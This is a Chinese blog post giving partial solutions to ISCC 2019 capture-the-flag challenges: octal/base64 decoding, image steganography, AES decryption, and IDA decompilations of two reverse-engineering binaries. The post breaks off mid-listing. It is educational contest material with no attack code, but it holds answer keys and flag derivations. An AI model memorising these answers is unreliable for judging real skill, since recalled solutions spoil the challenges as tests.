<!DOCTYPE html>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
  
  <title itemprop="name">ISCC部分wp | ki9mu&#39;s blog</title>
  
    <link rel="shortcut icon" href="/images/favicon.ico">
  
  <meta http-equiv="x-dns-prefetch-control" content="on">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+SerifMerriweather|Merriweather+Sans|Source+Code+Pro|Ubuntu:400,700|Noto+Serif+SC" media="all">
  <link rel="dns-prefetch" href="//cdn.jsdelivr.net">
  <link rel="stylesheet" id="saukra_css-css" href="/css/style.css" type="text/css" media="all">
  <link rel="stylesheet" href="/css/lib.min.css" media="all">
  <link rel="stylesheet" href="/css/font.css" media="all">
  <link rel="stylesheet" href="/css/insight.css" media="all">
  <link rel="stylesheet" href="/css/jquery.fancybox.min.css" media="all">
  <link rel="stylesheet" href="/css/zoom.css" media="all">
  <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
<!--   <link rel="stylesheet" id="saukra_css-css" href="https://2heng.xin/wp-content/cache/autoptimize/css/autoptimize_ad42a61f4c7d4bdd9f91afcff6b5dda5.css
" type="text/css" media="all"> -->
  <script>
  /*Initial Variables*/
  var mashiro_option = new Object();
  var mashiro_global = new Object();
  mashiro_option.NProgressON = true;
  /* 
   * 邮箱信息之类的东西可以填在这里，这些js变量基本都作用于sakura-app.js
   * 这样的设置仅是为了方便在基于PHP开发的主题中设置js变量，既然移植到了Node上，我想或许可以精简这一逻辑吧
   */
  mashiro_option.email_domain = "";
  mashiro_option.email_name = "";
  mashiro_option.cookie_version_control = "";
  mashiro_option.qzone_autocomplete = false;
  mashiro_option.site_name = "ki9mublog";
  mashiro_option.author_name = "blog";
  mashiro_option.site_url = "https://ki9mu.github.io";
  mashiro_option.v_appId = "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz";
  mashiro_option.v_appKey = "mgOpfzbkHYqU92CV4IDlAUHQ";
  mashiro_option.mathjax = "0";
  mashiro_option.qq_api_url = "https://api.mashiro.top/qqinfo/"; 
  mashiro_option.qq_avatar_api_url = "https://api.mashiro.top/qqinfo/";

  // mashiro_option.jsdelivr_css_src = "https://cdn.jsdelivr.net/gh/moezx/cdn@3.4.5/css/lib.min.css";
  // mashiro_option.float_player_on = true;

  /*End of Initial Variables*/
  </script>
  <script type="text/javascript">
  var bg = "https://ki9mu-photo.oss-cn-shanghai.aliyuncs.com/blog/background/1.jpg,https://ki9mu-photo.oss-cn-shanghai.aliyuncs.com/blog/background/2.jpg,https://ki9mu-photo.oss-cn-shanghai.aliyuncs.com/blog/background/3.jpg".split(",");
  var bgindex = Math.floor(Math.random()*bg.length);
  if (!!window.ActiveXObject || "ActiveXObject" in window) { //is IE?
    alert('朋友，IE浏览器未适配哦~');
  }
  </script>
  <style type="text/css">
  .hljs-ln{border-collapse:collapse}.hljs-ln td{padding:0}.hljs-ln-n:before{content:attr(data-line-number)}
  </style>
  <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
  </style>
</head>
</html>
<body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
  <div class="scrollbar" id="bar">
  </div>
  <a href="#" class="cd-top faa-float animated"></a>
  <section id="main-container">
    <div class="headertop filter-dot">
  <div id="banner_wave_1"></div>
  <div id="banner_wave_2"></div>
  <figure id="centerbg" class="centerbg">
    <div class="focusinfo no-select">
      <div class="header-tou">
        <a href="https://ki9mu.github.io">
          <img src="/images/avatar/avatar.jpg">
        </a>
      </div>
      <div class="header-info">
        <p>game to game,not to win!</p>
        <div class="top-social_v2">
          <li id="bg-pre">
            <img class="flipx" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
          </li>
          
            
              
                <li>
                  <a href="http://github.com/ki9mu" target="_blank" class="social-github" title="github">
                    <img src="/images/avatar/github.png">
                  </a>
                </li>
              
            
              
                <li>
                  <a href="https://www.zhihu.com/people/ki9mu" target="_blank" class="social-github" title="zhihu">
                    <img src="/images/avatar/zhihu.png">
                  </a>
                </li>
              
            
              
                <li class="wechat">
                  <a href="/#">
                    <img src="/images/avatar/wechat.png">
                  </a>
                  <div class="wechatInner">
                    <img src="/img/custom/wechat.jpg">
                  </div>
                </li>
              
            
          
          <li id="bg-next">
            <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
          </li>
        </div>
      </div>
    </div>
  </figure>
  <div id="video-container" style="">
    <video style="object-fit: fill" id="bgvideo" class="video" video-name="" src="" width="auto" preload="auto">
    </video>
    <div id="video-btn" class="loadvideo videolive">
    </div>
    <div id="video-add">
    </div>
    <div class="video-stu">
    </div>
  </div>
  <div class="headertop-down faa-float animated" onclick="headertop_down()">
    <span>
      <i class="fa fa-chevron-down" aria-hidden="true">
      </i>
    </span>
  </div>
</div>
    <div id="page" class="site wrapper">
      <header class="site-header no-select gizle sabit" role="banner">
  <div class="site-top">
    <div class="site-branding">
      <span class="site-title">
        <span class="logolink moe-mashiro">
          <a href="/">
            <span class="sakurasono">ki9mu</span>
            <span class="shironeko">blog</span>
          </a>
        </span>
      </span>
    </div>
    <div class="searchbox search-form-submit">
      <i class="iconfont js-toggle-search iconsearch icon-search">
      </i>
    </div>
    <div id="show-nav" class="showNav mobile-fit">
      <div class="line line1">
      </div>
      <div class="line line2">
      </div>
      <div class="line line3">
      </div>
    </div>
    <div class="lower-cantiner">
      <div class="lower">
        <nav class="mobile-fit-control hide">
          <ul id="menu-new" class="menu">
            
              <li>
                <a href="/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
                    首页
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/archives">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
                    归档
                  </span>
                </a>
                
                  <ul class="sub-menu">
                    
                      <li>
                        <a href="/categories/技术/">
                          <i class="fa fa-code" aria-hidden="true"></i>
                          技术
                        </a>
                      </li>
                    
                      <li>
                        <a href="/categories/生活/">
                          <i class="fa fa-file-text-o" aria-hidden="true"></i>
                          生活
                        </a>
                      </li>
                    
                      <li>
                        <a href="/categories/资源/">
                          <i class="fa fa-cloud-download" aria-hidden="true"></i>
                          资源
                        </a>
                      </li>
                    
                      <li>
                        <a href="/categories/随想/">
                          <i class="fa fa-commenting-o" aria-hidden="true"></i>
                          随想
                        </a>
                      </li>
                    
                      <li>
                        <a href="/categories/转载/">
                          <i class="fa fa-book" aria-hidden="true"></i>
                          转载
                        </a>
                      </li>
                    
                  </ul>
                
              </li>
            
              <li>
                <a href="javascript:;">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
                    清单
                  </span>
                </a>
                
                  <ul class="sub-menu">
                    
                      <li>
                        <a href="/tags/悦读/">
                          <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
                          书单
                        </a>
                      </li>
                    
                      <li>
                        <a href="/bangumi/">
                          <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
                          番组
                        </a>
                      </li>
                    
                      <li>
                        <a href="/music/">
                          <i class="fa fa-headphones" aria-hidden="true"></i>
                          歌单
                        </a>
                      </li>
                    
                      <li>
                        <a href="/tags/图集/">
                          <i class="fa fa-photo" aria-hidden="true"></i>
                          图集
                        </a>
                      </li>
                    
                  </ul>
                
              </li>
            
              <li>
                <a href="/comment/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
                    留言板
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/links/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
                    友人帐
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/donate/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-heart faa-pulse" aria-hidden="true"></i>
                    赞赏
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
                    关于
                  </span>
                </a>
                
                  <ul class="sub-menu">
                    
                      <li>
                        <a href="/about/">
                          <i class="fa fa-meetup" aria-hidden="true"></i>
                          我？
                        </a>
                      </li>
                    
                      <li>
                        <a href="/theme-sakura/">
                          <i class="fa iconfont icon-sakura" aria-hidden="true"></i>
                          主题
                        </a>
                      </li>
                    
                      <li>
                        <a href="/lab/">
                          <i class="fa fa-cogs" aria-hidden="true"></i>
                          Lab
                        </a>
                      </li>
                    
                  </ul>
                
              </li>
            
              <li>
                <a href="/client/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-android faa-vertical" aria-hidden="true"></i>
                    客户端
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/atom.xml">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-rss faa-pulse" aria-hidden="true"></i>
                    RSS
                  </span>
                </a>
                
              </li>
            
          </ul>
        </nav>
      </div>
    </div>
  </div>
</header>

      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
<div class="pattern-center-blank"></div>

<div id="content" class="site-content">
  <div id="primary" class="content-area">
    <main id="main" class="site-main" role="main">
      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
        <div class="toc"></div>
        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
        
          <header class="entry-header">
            <h1 class="entry-title">ISCC部分wp</h1>
            <p class="entry-census">ki9mu&nbsp;·&nbsp;2019-5-9&nbsp;·&nbsp;<span id="busuanzi_value_page_pv"></span>次阅读</p></p>

            <hr>
          </header>
        
        <div class="entry-content">
          <h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="隐藏的信息"><a href="#隐藏的信息" class="headerlink" title="隐藏的信息"></a>隐藏的信息</h2><p>下载后打开压缩包，里面有一个message.txt，内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0126 062 0126 0163 0142 0103 0102 0153 0142 062 065 0154 0111 0121 0157 0113 0111 0105 0132 0163 0131 0127 0143 066 0111 0105 0154 0124 0121 060 0116 067 0124 0152 0102 0146 0115 0107 065 0154 0130 062 0116 0150 0142 0154 071 0172 0144 0104 0102 0167 0130 063 0153 0167 0144 0130 060 0113</span><br></pre></td></tr></table></figure>

<p>根据内容中每个数据是0开头，以及没有大于7的数据可以很明显地看到这是8进制数据。<br>转化为ascii尝试一下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">V2VsbCBkb25lIQoKIEZsYWc6IElTQ0N7TjBfMG5lX2Nhbl9zdDBwX3kwdX0K</span><br></pre></td></tr></table></figure>

<p>这里可以看出来是base64编码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Well done!</span><br><span class="line">Flag: ISCC&#123;****************&#125;</span><br></pre></td></tr></table></figure>

<h2 id="倒立屋"><a href="#倒立屋" class="headerlink" title="倒立屋"></a>倒立屋</h2><p>下载后发现是一张图片<img src="https://p5.ssl.qhimg.com/t01281717cdc2f3d04c.png" alt="倒立屋.png"><br>图片隐写一般就那一套，先挨个试试(这道题是个巨无霸坑)。<br>IDAT隐写尝试：<br><img src="https://p5.ssl.qhimg.com/t015ba039e2a4272d5f.jpg" alt="IDAT扫描结果"><br>发现没藏什么特殊的东西。<br>LSB隐写尝试：<br><img src="https://p5.ssl.qhimg.com/t013b9e7a9fa0f6e3c3.jpg" alt="LSB"><br>这里能看到ISCC2019，心想主办方还有个彩蛋，但其实这里是个大坑。<br>正常ctf的格式一般是有花括号{}的。这道题的答案其实是9102_cCsI。</p>
<h2 id="Aesop’s-secret"><a href="#Aesop’s-secret" class="headerlink" title="Aesop’s secret"></a>Aesop’s secret</h2><p>打开发现是个闪烁的gif图，将它合成一张具体的图。<br><img src="https://p0.ssl.qhimg.com/t0192ccb02a204a3871.png" alt="合成后的图片"><br>发现看不出来什么，继续祭出神器分析。<br><img src="https://p2.ssl.qhimg.com/t01481fc3655f864bd9.jpg" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX19QwGkcgD0fTjZxgijRzQOGbCWALh4sRDec2w6xsY/ux53Vuj/AMZBDJ87qyZL5kAf1fmAH4Oe13Iu435bfRBuZgHpnRjTBn5+xsDHONiR3t0+Oa8yG/tOKJMNUauedvMyN4v4QKiFunw==</span><br></pre></td></tr></table></figure>

<p>这里能够看到一串base64，直接解发现是乱码。<br>合成的图肯定是有用的，尝试一波aes，密码为合成后图片中的ISCC<br><img src="https://p3.ssl.qhimg.com/t01969239157dfe8800.jpg" alt><br>base64解码发现还是乱码，再次aes一波，得到flag。<br><img src="https://p3.ssl.qhimg.com/t01258b3155461964ac.jpg" alt></p>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="answer-to-everything"><a href="#answer-to-everything" class="headerlink" title="answer to everything"></a>answer to everything</h2><p>这个文件名有问题，本以为是pe，没想到还是elf文件。ue打开文件头可以看出。<br>把文件后缀exe去了，拖入ida，f5进入main函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v4; // [sp+Ch] [bp-4h]@1</span><br><span class="line">  printf(&quot;Gimme: &quot;, argv, envp);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v4);</span><br><span class="line">  not_the_flag(v4);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第5行就是一个打印函数，第6行是输入。重点还是第7行的函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall not_the_flag(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  if ( a1 == 42 )</span><br><span class="line">    puts(&quot;Cipher from Bill \nSubmit without any tags\n#kdudpeh&quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;YOUSUCK&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里能看到，答案就是42，看到题目</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sha1 得到了一个神秘的二进制文件。寻找文件中的flag，解锁宇宙的秘密。</span><br><span class="line">注意：将得到的flag变为ISCC&#123;flag&#125;形式提交。</span><br></pre></td></tr></table></figure>

<p>然后将kdudpeh进行sha1一下，提交就是flag。<br>PS：我觉得这种题应该放在misc里。</p>
<h2 id="Rev01"><a href="#Rev01" class="headerlink" title="Rev01"></a>Rev01</h2><p>这里是个原题。<br>参考文章：<a href="https://www.anquanke.com/post/id/169970" target="_blank" rel="noopener">https://www.anquanke.com/post/id/169970</a><br>PS：第一题和第二题难度差太大了，幸好是原题。但也有一部分的坑。<br>本题是rust语言编写的，对我等菜鸡来说逆向难度相当大，一堆函数足以劝退逆向萌新了。<br>ida载入文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax@1</span><br><span class="line">  __int64 (__fastcall *v4)(); // [sp+0h] [bp-8h]@1</span><br><span class="line">  v4 = beginer_reverse::main::h80fa15281f646bc1;  //这里才是主函数，beginer_reverse也能看出来。</span><br><span class="line">  std::rt::lang_start_internal::had9505969b8e20a2(</span><br><span class="line">    (__int64)&amp;v4, (__int64)&amp;anon_0e239fffff9ba82fdffb4d9fcd948ac0_0_llvm_15443791065720472637,</span><br><span class="line">    argc,</span><br><span class="line">    (__int64)argv);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进之后的代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br></pre></td><td class="code"><pre><span class="line">void beginer_reverse::main::h80fa15281f646bc1()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; // rax@1</span><br><span class="line">  volatile signed __int64 *v1; // rax@2</span><br><span class="line">  bool v2; // zf@2</span><br><span class="line">  __int64 v3; // r13@5</span><br><span class="line">  signed __int64 v4; // rax@5</span><br><span class="line">  __int64 v5; // rcx@6</span><br><span class="line">  char v6; // dl@6</span><br><span class="line">  signed __int64 v7; // r8@6</span><br><span class="line">  char v8; // si@10</span><br><span class="line">  char v9; // di@12</span><br><span class="line">  int v10; // ebp@14</span><br><span class="line">  int v11; // esi@15</span><br><span class="line">  int v12; // edi@17</span><br><span class="line">  int v13; // edx@22</span><br><span class="line">  __int64 v14; // rcx@24</span><br><span class="line">  unsigned __int64 v15; // rsi@24</span><br><span class="line">  signed __int64 v16; // r14@24</span><br><span class="line">  unsigned __int64 v17; // rbp@24</span><br><span class="line">  int v18; // er12@25</span><br><span class="line">  unsigned __int64 v19; // rbx@25</span><br><span class="line">  signed __int64 v20; // rax@31</span><br><span class="line">  signed __int64 v21; // rax@33</span><br><span class="line">  __int64 v22; // rcx@38</span><br><span class="line">  int v23; // edx@40</span><br><span class="line">  __int64 v24; // rdx@45</span><br><span class="line">  unsigned __int64 v25; // rsi@45</span><br><span class="line">  __int64 v26; // rcx@45</span><br><span class="line">  volatile signed __int64 *v27; // [sp+0h] [bp-B8h]@2</span><br><span class="line">  __int64 v28; // [sp+8h] [bp-B0h]@2</span><br><span class="line">  __int128 v29; // [sp+10h] [bp-A8h]@2</span><br><span class="line">  __int128 v30; // [sp+20h] [bp-98h]@23</span><br><span class="line">  unsigned __int64 v31; // [sp+30h] [bp-88h]@35</span><br><span class="line">  __int64 v32; // [sp+38h] [bp-80h]@24</span><br><span class="line">  __int64 v33; // [sp+40h] [bp-78h]@2</span><br><span class="line">  __int128 v34; // [sp+48h] [bp-70h]@2</span><br><span class="line">  void **v35; // [sp+58h] [bp-60h]@2</span><br><span class="line">  __int128 v36; // [sp+60h] [bp-58h]@51</span><br><span class="line">  const char *v37; // [sp+78h] [bp-40h]@51</span><br><span class="line">  __int64 v38; // [sp+80h] [bp-38h]@51</span><br><span class="line"></span><br><span class="line">  _rust_alloc();</span><br><span class="line">  if ( !v0 )</span><br><span class="line">    alloc::alloc::handle_alloc_error::h9e3787e5722c870d();</span><br><span class="line">  *(_OWORD *)v0 = xmmword_51000;</span><br><span class="line">  *(_OWORD *)(v0 + 16) = xmmword_51010;</span><br><span class="line">  *(_OWORD *)(v0 + 32) = xmmword_51020;</span><br><span class="line">  *(_OWORD *)(v0 + 48) = xmmword_51030;</span><br><span class="line">  *(_OWORD *)(v0 + 64) = xmmword_51040;</span><br><span class="line">  *(_OWORD *)(v0 + 80) = xmmword_51050;</span><br><span class="line">  *(_OWORD *)(v0 + 96) = xmmword_51060;</span><br><span class="line">  *(_OWORD *)(v0 + 112) = xmmword_51070;</span><br><span class="line">  *(_QWORD *)(v0 + 128) = 618475290964LL;</span><br><span class="line">  v33 = v0;</span><br><span class="line">  v34 = xmmword_51080;</span><br><span class="line">  v28 = 1LL;</span><br><span class="line">  v29 = 0LL;</span><br><span class="line">  std::io::stdio::stdin::hcd3fd1740d5196a7();</span><br><span class="line">  v27 = v1;</span><br><span class="line">  std::io::stdio::Stdin::read_line::h85c3421ca914511e();</span><br><span class="line">  v2 = v35 == (void **)1;</span><br><span class="line">  if ( v35 == (void **)1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v30 = v36;</span><br><span class="line">    core::result::unwrap_failed::h2bf42cb74d1e7d4b(&quot;Error reading input: \x01&quot;, 19LL, &amp;v30);</span><br><span class="line">  &#125;</span><br><span class="line">  _InterlockedSub8(v27, 1uLL);</span><br><span class="line">  if ( v2 )</span><br><span class="line">    _$LT$alloc..sync..Arc$LT$T$GT$$GT$::drop_slow::h82dbb96617da66a0(&amp;v27, &amp;v27);</span><br><span class="line">  v3 = v28;</span><br><span class="line">  v4 = *((_QWORD *)&amp;v29 + 1);</span><br><span class="line">  if ( *((_QWORD *)&amp;v29 + 1) )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = *((_QWORD *)&amp;v29 + 1) + v28;</span><br><span class="line">    v6 = *(_BYTE *)(*((_QWORD *)&amp;v29 + 1) + v28 - 1);</span><br><span class="line">    v7 = 1LL;</span><br><span class="line">    if ( v6 &gt;= 0 )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_7:</span><br><span class="line">      v4 = *((_QWORD *)&amp;v29 + 1) - v7;</span><br><span class="line">      *((_QWORD *)&amp;v29 + 1) = v4;</span><br><span class="line">      v5 = v4 + v28;</span><br><span class="line">      goto LABEL_23;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v28 == v5 - 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = 0;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = *(_BYTE *)(v5 - 2);</span><br><span class="line">      if ( (*(_BYTE *)(v5 - 2) &amp; 0xC0) == -128 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v28 == v5 - 2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v12 = 0;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          v9 = *(_BYTE *)(v5 - 3);</span><br><span class="line">          if ( (*(_BYTE *)(v5 - 3) &amp; 0xC0) == -128 )</span><br><span class="line">          &#123;</span><br><span class="line">            if ( v28 == v5 - 3 )</span><br><span class="line">              v10 = 0;</span><br><span class="line">            else</span><br><span class="line">              v10 = (*(_BYTE *)(*((_QWORD *)&amp;v29 + 1) + v28 - 4) &amp; 7) &lt;&lt; 6;</span><br><span class="line">            v12 = v10 | v9 &amp; 0x3F;</span><br><span class="line">          &#125;</span><br><span class="line">          else</span><br><span class="line">          &#123;</span><br><span class="line">            v12 = v9 &amp; 0xF;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        v11 = (v12 &lt;&lt; 6) | v8 &amp; 0x3F;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        v11 = v8 &amp; 0x1F;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    